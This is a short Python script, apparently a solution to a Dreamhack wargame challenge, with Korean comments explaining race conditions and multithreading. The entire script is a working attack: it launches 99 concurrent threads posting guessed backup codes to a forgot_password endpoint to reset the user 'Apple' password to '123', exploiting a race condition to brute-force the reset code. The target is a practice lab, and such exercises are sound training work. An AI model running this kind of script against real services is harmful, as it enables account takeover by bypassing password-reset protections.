#race condition 취약점 (즉 두 개의 스레드가 하나의 자원을 놓고 서로 사용하려고 경쟁하는 상황을 말한다.)
#멀티쓰레드이용

import requests
import threading
url="http://host3.dreamhack.games:11092/forgot_password"

for i in range(1,100):
    params={"userid":"Apple","newpassword":"123","backupCode":i}
    t=threading.Thread(target=requests.post,args=(url,params))
    t.start()
    print(i)